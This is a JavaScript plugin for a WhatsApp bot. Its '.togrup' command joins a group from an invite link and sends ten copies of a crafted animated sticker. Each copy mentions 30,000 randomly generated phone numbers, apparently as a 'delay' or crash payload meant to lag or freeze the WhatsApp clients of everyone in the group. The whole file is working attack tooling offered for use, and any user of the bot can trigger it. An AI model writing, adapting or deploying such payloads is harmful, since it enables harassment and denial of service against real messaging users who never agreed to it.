let handler = async (m, { conn, args }) => {
  const link = args[0];

  if (!link || !link.includes('chat.whatsapp.com/')) {
    return m.reply('📎 *Debes proporcionar un enlace de grupo válido.*\n\nEjemplo: .togrup https://chat.whatsapp.com/xxxxxxxxxxxx');
  }

  const code = link.split('/').pop().trim();
  let groupJid;

  try {
    groupJid = await conn.groupAcceptInvite(code);
    await delay(1500);
    await m.reply(`✅ *Bot unido al grupo correctamente.*`);
  } catch (e) {
    try {
      const info = await conn.groupGetInviteInfo(code);
      groupJid = info.id;
    } catch (err) {
      return m.reply('❌ *No se pudo acceder al grupo.*');
    }
  }

  // 🌀 Ejecuta las funciones 10 veces
  for (let i = 0; i < 10; i++) {
    try {
      await DelayStickerNew(conn, groupJid);
      await delay(300);
    } catch (err) {
      console.log(`[ERROR EN ENVÍO ${i + 1}]`, err);
    }
  }

  await m.reply('✅ *Comando ejecutado con éxito.*');
};

handler.command = ['togrup'];
handler.owner = false;
handler.bot = false;

export default handler;

// 🧱 Función DelayStc adaptada
async function DelayStickerNew(Ken, target) {
  const stickerUrl = "https://mmg.whatsapp.net/v/t62.15575-24/12403361_728544836168227_8186125427718522054_n.enc?ccb=11-4&oh=01_Q5Aa1gHBXGoY4nJ2M27pLZSUwWBxUGwDd0sR8TPg6SqZeDKKkA&oe=6847F87B&_nc_sid=5e03e0&mms3=true";

  const mentionedJid = Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");

  const stickerMsg = {
    key: {
      remoteJid: target,
      fromMe: true,
      id: Date.now().toString()
    },
    message: {
      stickerMessage: {
        url: stickerUrl,
        mimetype: "image/webp",
        fileSha256: "CH6V5MN2Xl1XBEvRJ67jUo9B7PHVtfZzwo6iHC7E1ps=",
        fileEncSha256: "AFVKkyq/7/LocJByT0980T5h2I9qJrXgcukoBiZzAZk=",
        mediaKey: "h/8FwRZdeuDLx/C9JQLZd2YeeXdxIUH2/PO9QqXwOTw=",
        fileLength: { low: 38444, high: 0, unsigned: true }, 
        directPath: "/v/t62.15575-24/12403361_728544836168227_8186125427718522054_n.enc?ccb=11-4&oh=01_Q5Aa1gHBXGoY4nJ2M27pLZSUwWBxUGwDd0sR8TPg6SqZeDKKkA&oe=6847F87B&_nc_sid=5e03e0",
        mediaKeyTimestamp: 1746956112,
        firstFrameSidecar: "kk79ovc2beFGGA==",
        isAnimated: true,
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        stickerSentTs: "1746957642619",
        contextInfo: {
          mentionedJid          
        }
      }
    }
  };

  await Ken.relayMessage(target, stickerMsg.message, { messageId: stickerMsg.key.id });
  console.log(`[StickerDelay] Terkirim ke ${target}`);
}


// 🕒 Delay
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}